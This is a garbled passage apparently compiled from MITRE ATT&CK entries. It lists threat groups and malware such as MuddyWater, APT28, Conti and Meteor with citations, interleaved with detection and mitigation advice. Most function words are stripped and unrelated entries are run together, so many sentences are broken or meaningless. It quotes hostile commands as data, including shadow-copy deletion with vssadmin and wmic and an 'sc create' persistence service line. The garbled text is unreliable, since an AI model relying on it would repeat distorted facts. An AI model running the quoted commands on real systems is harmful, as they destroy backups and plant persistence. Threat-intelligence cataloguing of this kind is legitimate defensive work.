qualified paths appropriate.

Clean Windows Registry software uninstalled avoid legitimate binaries. Periodically search correct report path interception weaknesses systems introduced custom tools report software insecure path configurations.(Citation: CreateProcess)(Citation: Dynamic-Link Library Security)(Citation: Vulnerability Exploit Detector) [MuddyWater](https://attack.mitre.org/groups/G0069) controlled [POWERSTATS](https://attack.mitre.org/software/S0223) proxy network obfuscate C2 location.(Citation: Symantec MuddyWater Dec 2018) [MuddyWater](https://attack.mitre.org/groups/G0069) series compromised websites victims connected randomly relay command control (C2).(Citation: Reaqta MuddyWater November 2017)(Citation: Trend Micro Muddy Water March 2021) [Ke3chang](https://attack.mitre.org/groups/G0004) malware including RoyalCli BS2005 communicated C2 server Internet Explorer (IE) interface IWebBrowser2.(Citation: NCC APT15 Alive Strong)(Citation: NICKEL December 2021) [Clambling](https://attack.mitre.org/software/S0660) register service gain persistence.(Citation: Talent-Jump Clambling February 2020) [Bazar](https://attack.mitre.org/software/S0534) identify administrator accounts infected host.(Citation: NCC Team9 June 2020) (Citation: Bizeul 2014) (Citation: FireEye FIN7 Oct 2019) [Koadic](https://attack.mitre.org/software/S0250) download files target send server.(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021) [HEXANE](https://attack.mitre.org/groups/G1001) enumerated processes targeted systems.(Citation: Kaspersky Lyceum October 2021) [Gelsemium](https://attack.mitre.org/software/S0666) ability Windows API functions perform tasks.(Citation: ESET Gelsemium June 2021) Monitor abnormal DLLs loaded spoolsv.exe. Print processors correlate software patching suspicious.  print processor DLLs written print processor directory. [WIRTE](https://attack.mitre.org/groups/G0090) `regsvr32.exe` trigger execution malicious script.(Citation: Lab52 WIRTE Apr 2019) Windows 10, enable Attack Surface Reduction (ASR) rules prevent execution obfuscated payloads. (Citation: win10_asr) [MoleNet](https://attack.mitre.org/software/S0553) download additional payloads C2.(Citation: Cybereason Molerats Dec 2020)  [Calisto](https://attack.mitre.org/software/S0274) <code>zip -r</code> command compress data collected local system.(Citation: Securelist Calisto July 2018)(Citation: Symantec Calisto July 2018) [Kasidet](https://attack.mitre.org/software/S0088) ability search filename victim.(Citation: Zscaler Kasidet) [Sidewinder](https://attack.mitre.org/groups/G0121) named malicious files <code>rekeywiz.exe</code> match legitimate Windows executable.(Citation: Rewterz Sidewinder COVID-19 June 2020) [Ferocious](https://attack.mitre.org/software/S0679) delete files compromised host.(Citation: Kaspersky WIRTE November 2021) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). Monitor third-party application logging, messaging, artifacts third-party services disable Windows event logging limit data leveraged detections audits. Monitor executed commands arguments establish persistence elevate privileges mechanisms trigger execution based specific events. [Chaes](https://attack.mitre.org/software/S0631) JavaScript Node.Js stealer script exfiltrates data node process.(Citation: Cybereason Chaes Nov 2020) [CORESHELL](https://attack.mitre.org/software/S0137) installed execution rundll32 export named "init" "InitW."(Citation: SIR 19) Monitor DLL/PE file events, creation binary files loading DLLs processes. DLLs recognized loaded process. [Kimsuky](https://attack.mitre.org/groups/G0094) hosted content targeting efforts services Blogspot.(Citation: Talos Kimsuky Nov 2021) [TYPEFRAME](https://attack.mitre.org/software/S0263) malicious Word document delivery VBA macros execution.(Citation: US-CERT TYPEFRAME June 2018) [Diavol](https://attack.mitre.org/software/S0659) collect OS version system.(Citation: Fortinet Diavol July 2021) [Saint Bot](https://attack.mitre.org/software/S1018) disguised legitimate executable, including Windows SDK.(Citation: Malwarebytes Saint Bot April 2021) [Silence](https://attack.mitre.org/groups/G0091) deleted artifacts, including scheduled tasks, communicates files C2 logs.(Citation: Cyber Forensicator Silence Jan 2019)(Citation: IB Silence Sept 2018)	 [Gamaredon Group](https://attack.mitre.org/groups/G0047) registered multiple domains facilitate payload staging C2.(Citation: Actinium February 2022)(Citation: Unit 42 Gamaredon February 2022) Monitor newly executed processes interact Windows Registry gather system, configuration, installed software. (Citation: Symantec Orangeworm April 2018) [UNC2452](https://attack.mitre.org/groups/G0118) WMI remote execution files lateral movement.(Citation: 365 Defender Solorigate)(Citation: Deep Dive Solorigate January 2021) [APT28](https://attack.mitre.org/groups/G0007) exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263 escalate privileges.(Citation: Bitdefender APT28 Dec 2015)(Citation: SIR 19)(Citation: Securelist Sofacy Feb 2018) Trusted Platform Module technology secure trusted boot process prevent integrity compromised. (Citation: TCG Trusted Platform Module) (Citation: TechNet Secure Boot Process) (Citation: TCG Trusted Platform Module) (Citation: TechNet Secure Boot Process) Monitor API calls attempt dump credentials account login credential material, form hash password, operating software. Adversaries replace accessibility features binaries alternate binaries execute technique. Identify block malicious software executed accessibility features functionality application control (Citation: Beechey 2010) tools, Windows Defender Application Control(Citation: Windows Defender Application Control), AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Monitor third-party application logging, messaging, artifacts email rules hide inbound emails compromised user's mailbox. Monitor email clients applications suspicious activity, missing messages abnormal configuration log entries. [FIN8](https://attack.mitre.org/groups/G0061)'s malicious spearphishing payloads executed [PowerShell](https://attack.mitre.org/techniques/T1059/001). [FIN8](https://attack.mitre.org/groups/G0061) [PowerShell](https://attack.mitre.org/techniques/T1059/001) lateral movement credential access.(Citation: FireEye Obfuscation June 2017)(Citation: Bitdefender FIN8 July 2021)(Citation: FireEye Enemy FIN8 Aug 2016) Monitor DLL/PE file events, creation binary files loading DLLs processes. DLLs recognized loaded process. [SQLRat](https://attack.mitre.org/software/S0390) created scheduled tasks <code>%appdata%\Roaming\Microsoft\Templates\</code>.(Citation: Flashpoint FIN 7 March 2019) Monitor investigate attempts modify ACLs file/directory ownership. Monitor logged domain (DNS) registry data compromise third-party DNS servers targeting. activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Command Control. Enterprise email solutions monitoring mechanisms include ability audit auto-forwarding rules regular basis.

In Exchange environment, Administrators Get-InboxRule discover remove malicious auto-forwarding rules.(Citation: Tim McMichael Exchange Mail Forwarding 2). addition this, MAPI Editor utilized examine underlying database structure discover modifications/tampering properties auto-forwarding rules.(Citation: Pfammatter - Hidden Inbox Rules) [EvilGrab](https://attack.mitre.org/software/S0152) adds Registry key ctfmon.exe establish persistence.(Citation: PWC Cloud Hopper Technical Annex April 2017) [WINERACK](https://attack.mitre.org/software/S0219) enumerate services.(Citation: FireEye APT37 Feb 2018) [CCBkdr](https://attack.mitre.org/software/S0222) DGA [Fallback Channels](https://attack.mitre.org/techniques/T1008) communications primary command control server lost.(Citation: Talos CCleanup 2017) [Wizard Spider](https://attack.mitre.org/groups/G0102) taskkill.exe net.exe backup, catalog, cloud, services prior network encryption.(Citation: DFIR Ryuk's Return October 2020) [APT38](https://attack.mitre.org/groups/G0082)  attempted lure victims enabling malicious macros email attachments.(Citation: CISA AA20-239A BeagleBoyz August 2020) [BlackEnergy](https://attack.mitre.org/software/S0089) 3 variant drops main DLL component creates .lnk shortcut file startup folder.(Citation: F-Secure BlackEnergy 2014) Monitor systems abnormal Python usage python.exe behavior, indicator malicious activity. Understanding standard usage patterns avoid false positives. scripting restricted normal users, attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent. Scripts perform actions effects generate events, depending types monitoring used. Monitor newly executed processes abuse Python commands scripts execution. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level [Meteor](https://attack.mitre.org/software/S0688) `bcdedit` delete boot identifiers compromised host; `vssadmin.exe delete shadows /all /quiet` `C:\\Windows\\system32\\wbem\\wmic.exe shadowcopy delete`.(Citation: Check Meteor Aug 2021) [Leafminer](https://attack.mitre.org/groups/G0077) infected victims JavaScript code.(Citation: Symantec Leafminer July 2018) [Leviathan](https://attack.mitre.org/groups/G0065) exfiltrated data C2 channel.(Citation: CISA AA21-200A APT40 July 2021) [Tropic Trooper](https://attack.mitre.org/groups/G0081) detected target system’s OS version volume information.(Citation: TrendMicro TropicTrooper 2015)(Citation: TrendMicro Tropic Trooper 2020) [Helminth](https://attack.mitre.org/software/S0170) VBScript receives batch script execute set commands command prompt.(Citation: Palo Alto OilRig 2016) [Javali](https://attack.mitre.org/software/S0528) achieved execution victims malicious attachments, including MSI files embedded VBScript.(Citation: Securelist Brazilian Banking Malware July 2020) [TYPEFRAME](https://attack.mitre.org/software/S0263) variants add malicious DLL modules services.[TYPEFRAME](https://attack.mitre.org/software/S0263) delete services victim’s machine.(Citation: US-CERT TYPEFRAME June 2018) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) enumerated processes ID, name, privileges.(Citation: CISA MAR SLOTHFULMEDIA October 2020)  [APT33](https://attack.mitre.org/groups/G0064) utilized PowerShell download files C2 server scripts. (Citation: Symantec Elfin Mar 2019)(Citation: Holmium June 2020) Monitor hash dumpers Security Accounts Manager (SAM) local file (<code>%SystemRoot%/system32/config/SAM</code>). hash dumpers local file device parse SAM table avoid file access defenses. in-memory SAM table reading hashes. Detection compromised  [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use adversaries well. [WarzoneRAT](https://attack.mitre.org/software/S0670) `cmd.exe` execute malicious code.(Citation: Check Warzone Feb 2020) [Matryoshka](https://attack.mitre.org/software/S0167) rundll32.exe Registry key execution persistence mechanism.(Citation: CopyKittens Nov 2015) [HermeticWiper](https://attack.mitre.org/software/S0697) load drivers creating service `CreateServiceW` API.(Citation: Crowdstrike DriveSlayer February 2022) [Conti](https://attack.mitre.org/software/S0575) loaded encrypted DLL memory executes it.(Citation: Cybereason Conti Jan 2021)(Citation: CarbonBlack Conti July 2020) (Citation: Kaspersky Turla) [Kerrdown](https://attack.mitre.org/software/S0585) decode, decrypt, decompress multiple layers shellcode.(Citation: Unit 42 KerrDown February 2019) [Dragonfly](https://attack.mitre.org/groups/G0035) dropped executed SecretsDump dump password hashes.(Citation: US-CERT TA18-074A)(Citation: Core Security Impacket) Data loss prevention detect block sensitive data unencrypted protocols. [Earth Lusca](https://attack.mitre.org/groups/G1006) created service command <code>sc create “SysUpdate” binpath= “cmd /c start “[file path]””&&sc config “SysUpdate” start= auto&&net
start SysUpdate</code> persistence.(Citation: TrendMicro EarthLusca 2022) [Inception](https://attack.mitre.org/groups/G0100) encrypted network communications AES.(Citation: Kaspersky Cloud Atlas December 2014) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Malware researchers reverse engineer malware variants DGAs determine future domains malware attempt contact, time resource intensive effort.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA Brute Force) Malware increasingly incorporating seed values unique instance, determined extract future generated domains. cases, seed sample extracted DNS traffic.(Citation: Akamai DGA Mitigation) so, thousands domains generated day; impractical defenders preemptively register C2 domains cost. [Babuk](https://attack.mitre.org/software/S0638) ability check running processes targeted system.(Citation: Sogeti CERT ESEC Babuk March 2021)(Citation: McAfee Babuk February 2021)(Citation: Trend Micro Ransomware February 2021) [OilRig](https://attack.mitre.org/groups/G0049) credential dumping tools [LaZagne](https://attack.mitre.org/software/S0349) steal credentials accounts logged compromised Outlook Access.(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)(Citation: FireEye APT35 2018)(Citation: FireEye APT34 July 2019) [InvisiMole](https://attack.mitre.org/software/S0260) replace legitimate software documents compromised network trojanized versions, attempt propagate network.(Citation: ESET InvisiMole June 2020) [Bandook](https://attack.mitre.org/software/S0234) command delete file.(Citation: CheckPoint Bandook Nov 2020) Monitor newly executed processes abuse resource forks hide malicious code executables evade detection bypass security applications. [Proton](https://attack.mitre.org/software/S0279) captures content desktop screencapture binary.(Citation: objsee mac malware 2017) [Pysa](https://attack.mitre.org/software/S0583) services processes.(Citation: CERT-FR PYSA April 2020)  [OilRig](https://attack.mitre.org/groups/G0049) encrypted encoded data malware, including base64.(Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018)(Citation: Unit 42 Playbook Dec 2017)(Citation: Crowdstrike Helix Kitten Nov 2018)(Citation: Unit42 OilRig Nov 2018) [DOGCALL](https://attack.mitre.org/software/S0213) capture microphone data victim's machine.(Citation: Unit 42 Nokki Oct 2018) [Komplex](https://attack.mitre.org/software/S0162) C2 channel POST requests.(Citation: Sofacy Komplex Trojan) [CrackMapExec](https://attack.mitre.org/software/S0488) gather user accounts domain groups.(Citation: CME Github September 2018) [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) NetCat PortQry  enumerate network connections display status TCP UDP ports.(Citation: ESET BackdoorDiplomacy Jun 2021) [NETWIRE](https://attack.mitre.org/software/S0198) persist startup options Login items.(Citation: Red Canary NETWIRE January 2020) [jRAT](https://attack.mitre.org/software/S0283) capture microphone recordings.(Citation: Kaspersky Adwind Feb 2016) [Ke3chang](https://attack.mitre.org/groups/G0004) batch scripts malware install persistence mechanisms.(Citation: NCC APT15 Alive Strong) [Kimsuky](https://attack.mitre.org/groups/G0094) ability enumerate files directories infected system.(Citation: Securelist Kimsuky Sept 2013)(Citation: Talos Kimsuky Nov 2021)(Citation: KISA Operation Muzabi) [Hildegard](https://attack.mitre.org/software/S0601) downloaded additional scripts build Monero cryptocurrency miners.(Citation: Unit 42 Hildegard Malware) [Mis-Type](https://attack.mitre.org/software/S0084) transmitted collected files data C2 server.(Citation: Cylance Dust Storm) (Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)(Citation: Secureworks Cobalt Gypsy Feb 2017) [Ramsay](https://attack.mitre.org/software/S0458) collect directory file lists.(Citation: Eset Ramsay 2020)(Citation: Antiy CERT Ramsay April 2020)	 [Moses Staff](https://attack.mitre.org/groups/G1009) downloaded installed shells path <code>C:\inetpub\wwwroot\aspnet_client\system_web\IISpool.aspx</code>.(Citation: Checkpoint MosesStaff Nov 2021) [Tropic Trooper](https://attack.mitre.org/groups/G0081) search anti-virus software running system.(Citation: Unit 42 Tropic Trooper Nov 2016) [Penquin](https://attack.mitre.org/software/S0587) installs `TCP` `UDP` filter `eth0` interface.(Citation: Leonardo Turla Penquin 2020) Monitor analyze traffic flows follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware gathers data local victim system.(Citation: Citizen Lab Stealth Falcon 2016) [BITSAdmin](https://attack.mitre.org/software/S0190) create [BITS Jobs](https://attack.mitre.org/techniques/T1197) launch malicious process.(Citation: TrendMicro Tropic Trooper Mar 2018) [Darkhotel](https://attack.mitre.org/groups/G0012) first-stage payloads download additional malware C2 servers.(Citation: DUBNIUM June 2016) Windows 10, enable Attack Surface Reduction (ASR) rules prevent execution obfuscated scripts.(Citation: win10_asr) Perform physical inspection hardware potential tampering. Perform integrity checking pre-OS boot mechanisms manipulated malicious purposes compare baseline behavior. [Metamorfo](https://attack.mitre.org/software/S0455) enumerate windows victim’s machine.(Citation: FireEye Metamorfo Apr 2018)(Citation: Fortinet Metamorfo Feb 2020) [Kimsuky](https://attack.mitre.org/groups/G0094) gathering module hide AV software window victim.(Citation: Talos Kimsuky Nov 2021) [XCSSET](https://attack.mitre.org/software/S0658) ssh launchdaemon elevate privileges, bypass controls, enable remote access victim.(Citation: trendmicro xcsset xcode project 2020) Monitor newly constructed .manifest .local redirection files correlate software updates. Ensure permission level service binaries replaced modified users permission level. [Stuxnet](https://attack.mitre.org/software/S0603) collects time infected.(Citation: Symantec W.32 Stuxnet Dossier) [AADInternals](https://attack.mitre.org/software/S0677) enumerate Azure users.(Citation: AADInternals Documentation) multi-factor authentication. possible, enable multi-factor authentication externally facing services. [Zeus Panda](https://attack.mitre.org/software/S0330) hook GetClipboardData function watch clipboard pastes collect.(Citation: GDATA Zeus Panda June 2017) Monitor status firewall Windows Security Auditing events 5025 (The Windows firewall service stopped) 5034 (The Windows firewall driver stopped). [TDTESS](https://attack.mitre.org/software/S0164) reverse victim.(Citation: ClearSky Wilted Tulip July 2017) [Exaramel Windows](https://attack.mitre.org/software/S0343) specifies path store files scheduled exfiltration.(Citation: ESET TeleBots Oct 2018)  [KONNI](https://attack.mitre.org/software/S0356) AES encrypt C2 traffic.(Citation: Malwarebytes KONNI Evolves Jan 2022) [Lazarus Group](https://attack.mitre.org/groups/G0032) deployed malware designed computers set Korean, Japanese, Chinese Windows language preferences.(Citation: ClearSky Lazarus Aug 2020) [TrickBot](https://attack.mitre.org/software/S0266) ability capture RDP credentials capturing <code>CredEnumerateA</code> API(Citation: TrendMicro Trickbot Feb 2019)  [OopsIE](https://attack.mitre.org/software/S0264) creates scheduled task minutes.(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 OilRig Sept 2018) [Pisloader](https://attack.mitre.org/software/S0124) command upload file victim machine.(Citation: Palo Alto DNS Requests) Monitor executed commands arguments actions aid compression encrypting data collected prior exfiltration, tar.  Regsvcs Regasm environment. [Okrum](https://attack.mitre.org/software/S0439) NetSess discover NetBIOS sessions.(Citation: ESET Okrum July 2019) [GreyEnergy](https://attack.mitre.org/software/S0342) module harvest pressed keystrokes.(Citation: ESET GreyEnergy Oct 2018) [SILENTTRINITY](https://attack.mitre.org/software/S0692) `cmd.exe` enable lateral movement DCOM.(Citation: GitHub SILENTTRINITY Modules July 2019) [Epic](https://attack.mitre.org/software/S0091) <code>nbtstat -n</code> <code>nbtstat -s</code> commands victim’s machine.(Citation: Kaspersky Turla) [UNC2452](https://attack.mitre.org/groups/G0118) WinRM PowerShell execute command payloads remote hosts.(Citation: Symantec RAINDROP January 2021) [Penquin](https://attack.mitre.org/software/S0587) C2 mechanism based TCP UDP packets.(Citation: Kaspersky Turla Penquin December 2014)(Citation: Leonardo Turla Penquin 2020) Configure browsers/applications regularly delete persistent credentials (such cookies). (Citation: District Court Indictment GRU Unit 74455 October 2020)(Citation: Secureworks IRON VIKING ) [IceApple](https://attack.mitre.org/software/S1022) Directory Lister module list files directories including creation time, write time, name, size.(Citation: CrowdStrike IceApple 2022) Users trained identify social engineering techniques spearphishing emails. [TYPEFRAME](https://attack.mitre.org/software/S0263) variant fake TLS communicate C2 server.(Citation: US-CERT TYPEFRAME June 2018) Leverage services Content Delivery Networks (CDN) providers specializing DoS mitigations filter traffic upstream services.(Citation: CERT-EU DDoS March 2017) Filter boundary traffic blocking source addresses sourcing attack, blocking ports targeted, blocking protocols transport. defend SYN floods, enable SYN Cookies. [POWERSTATS](https://attack.mitre.org/software/S0223) retrieve execute additional [PowerShell](https://attack.mitre.org/techniques/T1059/001) payloads C2 server.(Citation: FireEye MuddyWater Mar 2018) [TSCookie](https://attack.mitre.org/software/S0436) ability identify IP infected host.(Citation: JPCert TSCookie March 2018) [Melcoz](https://attack.mitre.org/software/S0530) monitor content saved clipboard.(Citation: Securelist Brazilian Banking Malware July 2020) [Action RAT](https://attack.mitre.org/software/S1028) ability collect drive file infected machine.(Citation: MalwareBytes SideCopy Dec 2021) [EVILNUM](https://attack.mitre.org/software/S0568) search anti-virus products system.(Citation: Prevailion EvilNum 2020) [Remcos](https://attack.mitre.org/software/S0332) capture data system’s microphone.(Citation: Fortinet Remcos Feb 2017) [KGH_SPY](https://attack.mitre.org/software/S0526) execute PowerShell commands victim's machine.(Citation: Cybereason Kimsuky November 2020) Monitor network traffic anomalies AiTM behavior. monitoring modifications configuration files involved shaping network traffic flow. (Citation: Bitdefender FunnyDream Campaign November 2020) Limit user accounts load unload device drivers disabling <code>SeLoadDriverPrivilege</code>. [TA505](https://attack.mitre.org/groups/G0092) spearphishing emails malicious attachments initially compromise victims.(Citation: Proofpoint TA505 Sep 2017)(Citation: Proofpoint TA505 June 2018)(Citation: Proofpoint TA505 Jan 2019)(Citation: Cybereason TA505 April 2019)(Citation: ProofPoint SettingContent-ms July 2018)(Citation: Proofpoint TA505 Mar 2018)(Citation: Trend Micro TA505 June 2019)(Citation: Proofpoint TA505 October 2019)(Citation: IBM TA505 April 2020) [Turla](https://attack.mitre.org/groups/G0010) established persistence adding Registry key <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</code>.(Citation: ESET Turla Mosquito Jan 2018) [Daserf](https://attack.mitre.org/software/S0187) RC4 encryption obfuscate traffic.(Citation: Secureworks BRONZE BUTLER Oct 2017) Monitor unusual kernel driver installation activity configure settings automatically execute program boot logon maintain persistence gain higher-level privileges compromised systems. enabling DHCP Snooping Dynamic ARP Inspection switches create mappings IP addresses requested DHCP ARP tables tie values port switch block bogus traffic.(Citation: Cisco ARP Poisoning Mitigation 2016)(Citation: Juniper DAI 2020) [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors JavaScript code.(Citation: Cylance Dust Storm) [Metamorfo](https://attack.mitre.org/software/S0455) collected username victim's machine.(Citation: ESET Casbaneiro Oct 2019)  (Citation: Flashpoint FIN 7 March 2019) [WastedLocker](https://attack.mitre.org/software/S0612) execute service.(Citation: NCC WastedLocker June 2020) [MCMD](https://attack.mitre.org/software/S0500) upload additional files compromised host.(Citation: Secureworks MCMD July 2019) [TYPEFRAME](https://attack.mitre.org/software/S0263) install encrypted configuration data Registry key <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Applications\laxhost.dll</code> <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PrintConfigs</code>.(Citation: US-CERT TYPEFRAME June 2018) [ThreatNeedle](https://attack.mitre.org/software/S0665) chooses payload creation path randomly selected service netsvc.(Citation: Kaspersky ThreatNeedle Feb 2021) [Okrum](https://attack.mitre.org/software/S0439) custom implementation AES encryption encrypt collected data.(Citation: ESET Okrum July 2019) [GuLoader](https://attack.mitre.org/software/S0561) ability download malware Google Drive.(Citation: Medium Eli Salem GuLoader April 2021) [Cobalt Strike](https://attack.mitre.org/software/S0154) deliver additional payloads victim machines.(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) Monitor executed commands arguments attempt manipulate task service legitimate benign. [HEXANE](https://attack.mitre.org/groups/G1001) PowerShell-based keylogger named `kl.ps1`.(Citation: SecureWorks August 2019)(Citation: Kaspersky Lyceum October 2021) [Inception](https://attack.mitre.org/groups/G0100) reconnaissance module identify active processes loaded modules.(Citation: Symantec Inception Framework March 2018) [WIRTE](https://attack.mitre.org/groups/G0090) downloaded PowerShell code C2 server executed.(Citation: Lab52 WIRTE Apr 2019) [Taidoor](https://attack.mitre.org/software/S0011) <code>GetCurrentProcessId</code> process discovery.(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) Rundll32.exe executing [Flame](https://attack.mitre.org/software/S0143) command-line.(Citation: Crysys Skywiper) [Havij](https://attack.mitre.org/software/S0224) automate SQL injection.(Citation: Check Havij Analysis) [Hildegard](https://attack.mitre.org/software/S0601) queried Cloud Instance Metadata API cloud credentials.(Citation: Unit 42 Hildegard Malware) [Bisonal](https://attack.mitre.org/software/S0268) commands API calls gather information.(Citation: Unit 42 Bisonal July 2018)(Citation: Kaspersky CactusPete Aug 2020)(Citation: Talos Bisonal Mar 2020) [LazyScripter](https://attack.mitre.org/groups/G0140) `rundll32.exe` execute [Koadic](https://attack.mitre.org/software/S0250) stagers.(Citation: MalwareBytes LazyScripter Feb 2021)  [SUNBURST](https://attack.mitre.org/software/S0559) collected registry <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid</code> compromised hosts.(Citation: FireEye SUNBURST Backdoor December 2020) Configure SNMPv3 level security (authPriv) available.(Citation: US-CERT TA17-156A SNMP Abuse 2017) [Grandoreiro](https://attack.mitre.org/software/S0531) determine IP physical location compromised host IPinfo.(Citation: ESET Grandoreiro April 2020) [APT29](https://attack.mitre.org/groups/G0016) conducted enumeration Azure accounts.(Citation: MSTIC Nobelium Oct 2021) Restrict administrator accounts individuals possible, privilege principles.  Prevent credential overlap systems administrator privileged accounts, network non-network platforms, servers endpoints. [BabyShark](https://attack.mitre.org/software/S0414) executed <code>ipconfig /all</code> command.(Citation: Unit42 BabyShark Feb 2019)	 [FIN6](https://attack.mitre.org/groups/G0037) extracted password hashes ntds.dit crack offline.(Citation: FireEye FIN6 April 2016) [Mis-Type](https://attack.mitre.org/software/S0084) network traffic communicate raw socket.(Citation: Cylance Dust Storm) Adversaries binaries locations executed weakness. Identify block malicious software executed path interception application control (Citation: Beechey 2010) tools, Windows Defender Application Control(Citation: Windows Defender Application Control), AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) application deployment configured deploy signed binaries, ensure trusted signing certificates co-located application deployment located accessed remotely remote access tightly controlled. [QuasarRAT](https://attack.mitre.org/software/S0262) .dll file digitally signed certificate AirVPN.(Citation: Volexity Patchwork June 2018) [Chaes](https://attack.mitre.org/software/S0631) Puppeteer module hook monitor Chrome browser collect user infected hosts.(Citation: Cybereason Chaes Nov 2020) [Gelsemium](https://attack.mitre.org/software/S0666) HTTP/S C2 communications.(Citation: ESET Gelsemium June 2021) proxies enforce external network communication policy prevents unauthorized external services.  [Moses Staff](https://attack.mitre.org/groups/G1009) exploited vulnerabilities public-facing infrastructure Exchange Servers.(Citation: Checkpoint MosesStaff Nov 2021) Monitor newly executed processes gain persistence elevate privileges executing malicious content triggered Event Monitor Daemon (emond). [InnaputRAT](https://attack.mitre.org/software/S0259) variants attempted legitimate file names SafeApp.exe NeutralApp.exe.(Citation: ASERT InnaputRAT April 2018) (Citation: MSTIC NOBELIUM Mar 2021) (Citation: CrowdStrike SUNSPOT Implant January 2021)(Citation: MSTIC Nobelium Toolset 2021) [Kobalos](https://attack.mitre.org/software/S0641) compromised SSH client capture hostname, port, username password establish SSH connection compromised host.(Citation: ESET Kobalos Feb 2021)(Citation: ESET Kobalos Jan 2021)  Monitor authentication logs application login failures [Valid Accounts](https://attack.mitre.org/techniques/T1078). authentication failures high, brute force attempt gain access legitimate credentials. [SUNBURST](https://attack.mitre.org/software/S0559) checked variety antivirus/endpoint detection agents prior execution.(Citation: Analyzing Solorigate Dec 2020)(Citation: FireEye SUNBURST Additional Details Dec 2020) [AppleSeed](https://attack.mitre.org/software/S0622) delete files compromised host exfiltrated.(Citation: Malwarebytes Kimsuky June 2021) (Citation: Mandiant APT1 Appendix) disabling Office macros/active content prevent execution malicious payloads documents (Citation: Disable Macros), setting mitigate [Forced Authentication](https://attack.mitre.org/techniques/T1187) technique. Follow practices network firewall configurations ports traffic enter exit network.(Citation: TechNet Firewall Design) [WannaCry](https://attack.mitre.org/software/S0366) [Tor](https://attack.mitre.org/software/S0183) command control traffic.(Citation: SecureWorks WannaCry Analysis) [TEMP.Veles](https://attack.mitre.org/groups/G0088) compromised VPN accounts.(Citation: FireEye TRITON 2019)	 Monitor contextual data file highlight embedded payloads, include name, content (ex: signature, headers, data/media), file size, etc.; correlate suspicious behavior reduce false positives.   [WarzoneRAT](https://attack.mitre.org/software/S0670) ability performing remote desktop access VNC console.(Citation: Check Warzone Feb 2020) [Amadey](https://attack.mitre.org/software/S1025) changed Startup folder executable overwriting registry keys.(Citation: Korean FSI TA505 2020)(Citation: BlackBerry Amadey 2020) [Higaisa](https://attack.mitre.org/groups/G0126) named shellcode loader binary <code>svchast.exe</code> spoof legitimate <code>svchost.exe</code>.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)  [Aquatic Panda](https://attack.mitre.org/groups/G0143) native OS commands understand privilege levels details.(Citation: CrowdStrike AQUATIC PANDA December 2021) Cloud service providers support IP-based restrictions accessing cloud resources. IP allowlisting user account management ensure data access restricted valid users expected IP ranges mitigate stolen credentials access data. Monitor systems abnormal Python usage python.exe behavior, indicator malicious activity. Understanding standard usage patterns avoid false positives. scripting restricted normal users, attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent. Scripts perform actions effects generate events, depending types monitoring used. Monitor executed commands arguments abuse Python commands scripts execution. [Bumblebee](https://attack.mitre.org/software/S1039) achieve persistence copying DLL subdirectory %APPDATA% creating Visual Basic Script load DLL scheduled task.(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) exploited CVE-2017-0005 local privilege escalation.(Citation: Check APT31 February 2021) Remove vulnerable Policy Preferences.(Citation: MS14-025) [ZeroT](https://attack.mitre.org/software/S0230) RC4 encrypt C2 traffic.(Citation: Proofpoint TA459 April 2017)(Citation: Proofpoint ZeroT Feb 2017) [FunnyDream](https://attack.mitre.org/campaigns/C0007), [Chinoxy](https://attack.mitre.org/software/S1041) gain persistence deploy malware components.(Citation: Bitdefender FunnyDream Campaign November 2020) [FIN7](https://attack.mitre.org/groups/G0046) spearphishing emails malicious Documents RTF files attached.(Citation: FireEye FIN7 April 2017)(Citation: DOJ FIN7 Aug 2018)(Citation: Flashpoint FIN 7 March 2019)(Citation: eSentire FIN7 July 2021)(Citation: CrowdStrike Carbon Spider August 2021) (Citation: ClearSky Charming Kitten Dec 2017) Monitor LSA process DLL loads. Windows 8.1 Windows Server 2012 R2 generate events unsigned DLLs load LSA setting Registry key <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe</code> AuditLevel = 8. (Citation: Graeber 2014) (Citation: Configure LSA) [Calisto](https://attack.mitre.org/software/S0274)'s installation file unsigned DMG image guise 